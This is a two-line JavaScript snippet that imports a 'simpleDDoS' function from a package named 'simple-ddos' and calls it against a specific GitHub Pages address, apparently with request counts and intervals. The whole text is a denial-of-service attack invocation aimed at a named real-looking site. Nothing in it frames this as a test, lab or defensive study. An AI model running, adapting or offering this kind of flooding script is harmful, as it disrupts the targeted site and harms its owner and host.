import { simpleDDoS } from 'simple-ddos'

simpleDDoS(5, 'https://t0m0t0w.github.io', 500, 1000)